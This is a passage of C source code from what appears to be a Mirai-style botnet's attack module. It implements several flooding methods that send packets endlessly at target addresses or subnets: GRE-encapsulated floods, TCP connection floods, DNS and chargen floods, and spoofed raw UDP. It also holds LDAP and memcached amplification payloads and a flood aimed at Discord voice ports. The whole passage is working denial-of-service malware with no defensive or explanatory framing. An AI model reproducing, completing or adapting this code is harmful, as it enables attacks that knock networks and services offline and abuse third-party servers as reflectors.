    if (burst < 4) burst = 4;
    if (burst > 64) burst = 64;
    size_t eth_len = sizeof(struct ethhdr);
    size_t inner_sz = sizeof(struct iphdr) + sizeof(struct udphdr) + data_len;
    size_t pkt_sz = sizeof(struct iphdr) + sizeof(struct grehdr) + eth_len + inner_sz;

    if (data_len > 1200) data_len = 1200;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1) { close(fd); return; }
    i = SNDBUF_MAX;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));

    for (i = 0; i < targs_len; i++) {
        struct iphdr *iph;
        struct grehdr *greh;
        struct ethhdr *eth;
        struct iphdr *greiph;
        struct udphdr *udph;
        pkts[i] = calloc(1600, 1);
        if (!pkts[i]) {
            for (int j = 0; j < i; j++) free(pkts[j]);
            free(pkts);
            close(fd);
            return;
        }
        iph = (struct iphdr *)pkts[i];
        greh = (struct grehdr *)(iph + 1);
        eth = (struct ethhdr *)(greh + 1);
        greiph = (struct iphdr *)(eth + 1);
        udph = (struct udphdr *)(greiph + 1);
        iph->version = 4; iph->ihl = 5; iph->tos = ip_tos;
        iph->tot_len = htons(pkt_sz);
        iph->id = htons(ip_ident == 0xffff ? (rand_next() & 0xffff) : ip_ident);
        iph->ttl = ip_ttl; iph->protocol = IPPROTO_GRE;
        iph->frag_off = dont_frag ? htons(1 << 14) : 0;
        iph->saddr = source_ip; iph->daddr = targs[i].addr;
        greh->opts = 0; greh->protocol = htons(0x6558);
        memset(eth->h_dest, 0xff, 6);
        memset(eth->h_source, 0, 6);
        eth->h_proto = htons(ETH_P_IP);
        greiph->version = 4; greiph->ihl = 5; greiph->tos = ip_tos;
        greiph->tot_len = htons(inner_sz);
        greiph->id = htons(rand_next() & 0xffff);
        greiph->ttl = ip_ttl; greiph->protocol = IPPROTO_UDP;
        greiph->frag_off = dont_frag ? htons(1 << 14) : 0;
        greiph->saddr = rand_next();
        greiph->daddr = gcip ? targs[i].addr : rand_next();
        udph->source = htons(sport == 0xffff ? (rand_next() & 0xffff) : sport);
        udph->dest = htons(dport == 0xffff ? 80 : dport);
        udph->len = htons(sizeof(struct udphdr) + data_len);
    }

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct iphdr *greiph = (struct iphdr *)((char *)(greh + 1) + eth_len);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff) iph->saddr = rand_next();
            if (ip_ident == 0xffff) iph->id = htons(rand_next() & 0xffff);
            if (sport == 0xffff) udph->source = htons(rand_next() & 0xffff);
            if (dport == 0xffff) udph->dest = htons(rand_next() & 0xffff);
            if (!gcip) greiph->daddr = rand_next();
            else greiph->daddr = iph->daddr;
            if (data_rand) rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof(struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof(struct udphdr) + data_len);
            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            for (int b = 0; b < burst; b++)
                sendto(fd, pkt, pkt_sz, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}


void attack_method_grestack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd, burst;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 256);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 32);
    if (burst < 8) burst = 8;
    if (burst > 128) burst = 128;
    if (data_len > 400) data_len = 400;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1) { close(fd); return; }
    i = 4 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));

    size_t inner_sz = sizeof(struct iphdr) + sizeof(struct udphdr) + data_len;
    size_t pkt_sz = sizeof(struct iphdr) + 8 + 4 + sizeof(struct ethhdr) + inner_sz;
    for (i = 0; i < targs_len; i++) {
        pkts[i] = calloc(1600, 1);
        if (!pkts[i]) {
            for (int j = 0; j < i; j++) free(pkts[j]);
            free(pkts);
            close(fd);
            return;
        }
    }

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            uint16_t *greh = (uint16_t *)(iph + 1);
            struct ethhdr *eth = (struct ethhdr *)((char *)greh + 8);
            struct iphdr *greiph = (struct iphdr *)(eth + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);

            ipv4_t dst = targs[i].netmask < 32 ?
                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;

            iph->version = 4; iph->ihl = 5; iph->tos = ip_tos;
            iph->tot_len = htons(pkt_sz);
            iph->id = htons(ip_ident == 0xffff ? (rand_next() & 0xffff) : ip_ident);
            iph->ttl = ip_ttl; iph->protocol = 47;
            iph->frag_off = 0;
            iph->saddr = source_ip == 0xffffffff ? rand_next() : source_ip;
            iph->daddr = dst;
            greh[0] = 0; greh[1] = htons(0x6558);
            greh[2] = htons(rand_next() & 0xffff);
            greh[3] = htons(rand_next() & 0xffff);
            memset(eth->h_dest, 0xff, 6);
            memset(eth->h_source, 0, 6);
            eth->h_proto = htons(0x0800);
            greiph->version = 4; greiph->ihl = 5; greiph->tos = ip_tos;
            greiph->tot_len = htons(inner_sz);
            greiph->id = htons(rand_next() & 0xffff);
            greiph->ttl = 32 + (rand_next() % 32);
            greiph->protocol = IPPROTO_UDP;
            greiph->frag_off = htons((rand_next() & 1) ? 0x2000 : 0);
            greiph->saddr = rand_next();
            greiph->daddr = dst;
            udph->source = htons(sport == 0xffff ? (rand_next() & 0xffff) : sport);
            udph->dest = htons(dport == 0xffff ? 80 : dport);
            udph->len = htons(sizeof(struct udphdr) + data_len);
            if (data_rand) rand_str(data, data_len);
            iph->check = 0; iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            greiph->check = 0; greiph->check = checksum_generic((uint16_t *)greiph, sizeof(struct iphdr));
            udph->check = 0; udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof(struct udphdr) + data_len);
            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = dst;
            targs[i].sock_addr.sin_port = 0;
            for (int b = 0; b < burst; b++)
                sendto(fd, pkt, pkt_sz, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}


void attack_method_connect(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, conns, sock;
    uint16_t dport;
    struct sockaddr_in target;
    int *fds;
    conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 256);
    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    if (conns > 512) conns = 512;
    if (conns < 16) conns = 16;
    fds = calloc(conns, sizeof(int));
    if (!fds) return;
    target.sin_family = AF_INET;
    target.sin_port = htons(dport);
    for (i = 0; i < conns; i++) fds[i] = -1;
    while (TRUE) {
        for (i = 0; i < conns; i++) {
            if (fds[i] >= 0) { close(fds[i]); fds[i] = -1; }
            target.sin_addr.s_addr = targs[i % targs_len].netmask < 32 ?
                htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask)) : targs[i % targs_len].addr;
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            fcntl(sock, F_SETFL, O_NONBLOCK | fcntl(sock, F_GETFL, 0));
            connect(sock, (struct sockaddr *)&target, sizeof(target));
            fds[i] = sock;
        }
    }
}


void attack_method_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, sock, burst;
    uint16_t sport, dport;
    struct sockaddr_in bind_a, target;
    char *domain;
    char qbuf[512];
    int qlen;
    struct dnshdr *dns;
    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 53);
    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, "google.com");
    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 16);
    if (burst < 4) burst = 4;
    if (burst > 64) burst = 64;
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;
    i = SNDBUF_MAX;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));
    bind_a.sin_family = AF_INET;
    bind_a.sin_addr.s_addr = 0;
    bind_a.sin_port = (sport == 0xffff) ? htons(rand_next() % 60000 + 1024) : htons(sport);
    bind(sock, (struct sockaddr *)&bind_a, sizeof(bind_a));
    target.sin_family = AF_INET;
    target.sin_port = htons(dport);
    dns = (struct dnshdr *)qbuf;
    dns->id = htons(rand_next() & 0xffff);
    dns->opts = htons(0x0100);
    dns->qdcount = htons(1);
    dns->ancount = dns->nscount = dns->arcount = 0;
    qlen = 12;
    char *p = qbuf + 12;
    const char *d = domain;
    while (*d && qlen < 250) {
        char *lab = p++;
        int l = 0;
        while (*d && *d != '.' && qlen < 250) { *p++ = *d++; l++; qlen++; }
        *lab = l;
        qlen++;
        if (*d == '.') d++;
    }
    *p++ = 0; qlen++;
    *((uint16_t *)p) = htons(PROTO_DNS_QTYPE_A); p += 2;
    *((uint16_t *)p) = htons(PROTO_DNS_QCLASS_IP); p += 2;
    qlen += 4;
    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            target.sin_addr.s_addr = targs[i].netmask < 32 ?
                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;
            dns->id = htons(rand_next() & 0xffff);
            for (int b = 0; b < burst; b++)
                sendto(sock, qbuf, qlen, MSG_NOSIGNAL, (struct sockaddr *)&target, sizeof(target));
        }
    }
}


void attack_method_ldap(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, sock, burst;
    uint16_t sport, dport;
    struct sockaddr_in bind_a, target;
    char payload[] = "\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00";
    int plen = sizeof(payload) - 1;
    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 389);
    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 16);
    if (burst < 4) burst = 4;
    if (burst > 64) burst = 64;
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;
    i = SNDBUF_MAX;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));
    bind_a.sin_family = AF_INET;
    bind_a.sin_addr.s_addr = 0;
    bind_a.sin_port = (sport == 0xffff) ? htons(rand_next() % 60000 + 1024) : htons(sport);
    bind(sock, (struct sockaddr *)&bind_a, sizeof(bind_a));
    target.sin_family = AF_INET;
    target.sin_port = htons(dport);
    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            target.sin_addr.s_addr = targs[i].netmask < 32 ?
                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;
            for (int b = 0; b < burst; b++)
                sendto(sock, payload, plen, MSG_NOSIGNAL, (struct sockaddr *)&target, sizeof(target));
        }
    }
}


void attack_method_chargen(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, sock, burst;
    uint16_t sport, dport;
    int data_len;
    struct sockaddr_in bind_a, target;
    char *data;
    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 19);
    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    if (data_len > 1400) data_len = 1400;
    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 16);
    if (burst < 4) burst = 4;
    if (burst > 64) burst = 64;
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;
    i = SNDBUF_MAX;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));
    bind_a.sin_family = AF_INET;
    bind_a.sin_addr.s_addr = 0;
    bind_a.sin_port = (sport == 0xffff) ? htons(rand_next() % 60000 + 1024) : htons(sport);
    bind(sock, (struct sockaddr *)&bind_a, sizeof(bind_a));
    target.sin_family = AF_INET;
    target.sin_port = htons(dport);
    data = malloc(data_len);
    if (!data) { close(sock); return; }
    for (i = 0; i < data_len; i++) data[i] = (i % 94) + 33;
    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            target.sin_addr.s_addr = targs[i].netmask < 32 ?
                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;
            for (int b = 0; b < burst; b++)
                sendto(sock, data, data_len, MSG_NOSIGNAL, (struct sockaddr *)&target, sizeof(target));
        }
    }
}


void attack_method_memcached(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, sock, burst;
    uint16_t sport, dport;
    struct sockaddr_in bind_a, target;
    char payload[] = "\x00\x00\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a";
    int plen = sizeof(payload) - 1;
    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 11211);
    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 16);
    if (burst < 4) burst = 4;
    if (burst > 64) burst = 64;
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;
    i = SNDBUF_MAX;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));
    bind_a.sin_family = AF_INET;
    bind_a.sin_addr.s_addr = 0;
    bind_a.sin_port = (sport == 0xffff) ? htons(rand_next() % 60000 + 1024) : htons(sport);
    bind(sock, (struct sockaddr *)&bind_a, sizeof(bind_a));
    target.sin_family = AF_INET;
    target.sin_port = htons(dport);
    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            target.sin_addr.s_addr = targs[i].netmask < 32 ?
                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;
            for (int b = 0; b < burst; b++)
                sendto(sock, payload, plen, MSG_NOSIGNAL, (struct sockaddr *)&target, sizeof(target));
        }
    }
}


void attack_method_udpx(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd, burst, data_len, pkt_size;
    uint8_t ip_ttl, ip_tos;
    uint16_t sport, dport;
    struct iphdr *iph;
    struct udphdr *udph;
    char *data;
    char pkt[1510];
    struct sockaddr_in dst;
    struct dnshdr *dns;
    int mode;

    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 128);
    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 128);
    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 53);
    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    mode = attack_get_opt_int(opts_len, opts, ATK_OPT_METHOD, 0);
    if (burst < 32) burst = 32;
    if (burst > 512) burst = 512;
    if (data_len < 32) data_len = 32;
    if (data_len > 1400) data_len = 1400;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return;
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) < 0) { close(fd); return; }
    i = SNDBUF_MAX;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));

    pkt_size = sizeof(struct iphdr) + sizeof(struct udphdr) + data_len;
    iph = (struct iphdr *)pkt;
    udph = (struct udphdr *)(pkt + sizeof(struct iphdr));
    data = pkt + sizeof(struct iphdr) + sizeof(struct udphdr);
    dst.sin_family = AF_INET;
    dst.sin_port = htons(dport);

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            uint32_t target = targs[i].netmask < 32 ?
                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;
            dst.sin_addr.s_addr = target;

            iph->version = 4; iph->ihl = 5; iph->tos = ip_tos;
            iph->tot_len = htons(pkt_size);
            iph->id = htons(rand_next() & 0xffff);
            iph->ttl = 48 + (rand_next() % 24);
            iph->protocol = IPPROTO_UDP;
            iph->frag_off = 0;
            iph->saddr = rand_next();
            iph->daddr = target;
            udph->source = htons((sport == 0xffff) ? (rand_next() % 60000 + 1024) : sport);
            udph->dest = htons(dport);
            udph->len = htons(sizeof(struct udphdr) + data_len);
            udph->check = 0;

            if (mode == 0) {
                dns = (struct dnshdr *)data;
                dns->id = htons(rand_next() & 0xffff);
                dns->opts = htons(0x0100);
                dns->qdcount = htons(1);
                dns->ancount = dns->nscount = dns->arcount = 0;
                rand_str(data + 12, data_len - 12);
            } else if (mode == 1) {
                data[0] = 0x1b;
                data[1] = rand_next() & 0xff;
                data[2] = data[3] = data[4] = data[5] = 0;
                rand_str(data + 6, data_len - 6);
            } else {
                data[0] = 0xc0; data[1] = rand_next() & 0x3f;
                rand_str(data + 2, data_len - 2);
            }

            iph->check = 0; iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + data_len);

            for (int b = 0; b < burst; b++) {
                iph->id = htons(rand_next() & 0xffff);
                iph->ttl = 48 + (rand_next() % 24);
                iph->saddr = rand_next();
                udph->source = htons(rand_next() % 60000 + 1024);
                if (mode == 0) dns->id = htons(rand_next() & 0xffff);
                else if (mode == 1) data[1] = rand_next() & 0xff;
                else data[1] = rand_next() & 0x3f;
                rand_str(data + (mode == 0 ? 12 : (mode == 1 ? 6 : 2)), data_len - (mode == 0 ? 12 : (mode == 1 ? 6 : 2)));
                iph->check = 0; iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                udph->check = 0; udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + data_len);
                sendto(fd, pkt, pkt_size, MSG_NOSIGNAL, (struct sockaddr *)&dst, sizeof(dst));
            }
        }
    }
}

void attack_method_discord(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd, burst;
    uint16_t sport, dport, data_len;
    struct sockaddr_in dst;
    char *data;

    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 50000);
    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 200);
    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 16);
    if (burst < 4) burst = 4;
    if (burst > 128) burst = 128;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    i = SNDBUF_MAX;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));

    if (data_len < 12) data_len = 12;
    data = malloc(data_len);
    if (!data) { close(fd); return; }

    dst.sin_family = AF_INET;
    dst.sin_port = htons(dport);

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            uint32_t target = targs[i].netmask < 32 ?
                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;
            dst.sin_addr.s_addr = target;

            // RTP voice header (12 bytes)
            data[0] = 0x80;  // V=2, P=0, X=0, CC=0
            data[1] = 0x60;  // M=0, PT=96 (Dynamic/OPUS)
            *(uint16_t *)(data + 2) = htons(rand_next() & 0xffff);  // seq
            *(uint32_t *)(data + 4) = rand_next();                   // timestamp
            *(uint32_t *)(data + 8) = rand_next();                   // SSRC
            rand_str(data + 12, data_len - 12);

            for (int b = 0; b < burst; b++) {
                *(uint16_t *)(data + 2) = htons((rand_next() & 0xffff));  // increment seq
                sendto(fd, data, data_len, MSG_NOSIGNAL, (struct sockaddr *)&dst, sizeof(dst));
            }
        }
    }
}
